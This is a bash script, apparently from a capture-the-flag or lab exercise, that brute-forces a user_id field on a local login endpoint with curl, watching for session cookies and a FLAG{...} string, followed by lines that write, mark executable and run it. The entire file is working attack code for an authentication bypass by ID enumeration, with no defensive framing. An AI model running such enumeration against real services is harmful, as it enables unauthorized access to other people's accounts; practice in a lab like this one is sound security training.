#!/bin/bash

echo "=== Starting Authentication ID Fuzzing ==="
echo "Target: http://127.0.0.1:32783/password/test"
echo "Testing user_id range: 10030-10040 (narrow range)"
echo ""

FLAG_FOUND=""
SUCCESS_AUTH=""

for i in {10030..10040}; do
  echo "Testing user_id: $i"
  
  RESPONSE=$(curl -X POST "http://127.0.0.1:32783/password/test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&user_id=$i&password=test" \
    -w "\nHTTP_STATUS_CODE:%{http_code}\n" \
    -v 2>&1)
  
  HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS_CODE:" | cut -d: -f2 | tr -d '\n')
  echo "  Status: $HTTP_STATUS"
  
  SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "set-cookie:" | head -1)
  if [ ! -z "$SESSION_COOKIE" ]; then
    echo "  ✓ Session Cookie SET: $SESSION_COOKIE"
    SUCCESS_AUTH="user_id=$i - SESSION CREATED"
  else
    echo "  ✗ No session cookie"
  fi
  
  if echo "$RESPONSE" | grep -q "FLAG{"; then
    FLAG_VALUE=$(echo "$RESPONSE" | grep -o "FLAG{[^}]*}")
    echo "  🚩 FLAG FOUND: $FLAG_VALUE"
    FLAG_FOUND="user_id=$i - $FLAG_VALUE"
    break
  fi
  
  if echo "$RESPONSE" | grep -qi "success"; then
    echo "  → Response contains 'success'"
  fi
  if echo "$RESPONSE" | grep -qi "authenticated"; then
    echo "  → Response contains 'authenticated'"
  fi
  
  echo ""
done

echo "=== Expanding to full range 10000-10050 ==="
echo ""

for i in {10000..10050}; do
  if [ $i -ge 10030 ] && [ $i -le 10040 ]; then
    continue
  fi
  
  echo "Testing user_id: $i"
  
  RESPONSE=$(curl -X POST "http://127.0.0.1:32783/password/test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&user_id=$i&password=test" \
    -w "\nHTTP_STATUS_CODE:%{http_code}\n" \
    -v 2>&1)
  
  HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS_CODE:" | cut -d: -f2 | tr -d '\n')
  echo "  Status: $HTTP_STATUS"
  
  SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "set-cookie:" | head -1)
  if [ ! -z "$SESSION_COOKIE" ]; then
    echo "  ✓ Session Cookie SET: $SESSION_COOKIE"
    if [ -z "$SUCCESS_AUTH" ]; then
      SUCCESS_AUTH="user_id=$i - SESSION CREATED"
    fi
  else
    echo "  ✗ No session cookie"
  fi
  
  if echo "$RESPONSE" | grep -q "FLAG{"; then
    FLAG_VALUE=$(echo "$RESPONSE" | grep -o "FLAG{[^}]*}")
    echo "  🚩 FLAG FOUND: $FLAG_VALUE"
    FLAG_FOUND="user_id=$i - $FLAG_VALUE"
    break
  fi
  
  if echo "$RESPONSE" | grep -qi "success"; then
    echo "  → Response contains 'success'"
  fi
  if echo "$RESPONSE" | grep -qi "authenticated"; then
    echo "  → Response contains 'authenticated'"
  fi
  
  echo ""
done

echo "=== FUZZING CAMPAIGN COMPLETE ==="
echo ""
if [ ! -z "$FLAG_FOUND" ]; then
  echo "🚩 FLAG DISCOVERED: $FLAG_FOUND"
else
  echo "No flags found in tested range"
fi

if [ ! -z "$SUCCESS_AUTH" ]; then
  echo "✓ Authentication Success: $SUCCESS_AUTH"
else
  echo "No successful authentication detected"
fi
EOF

echo "File created successfully"
ls -la /tmp/auth_fuzz.sh
chmod +x /tmp/auth_fuzz.sh
bash /tmp/auth_fuzz.sh
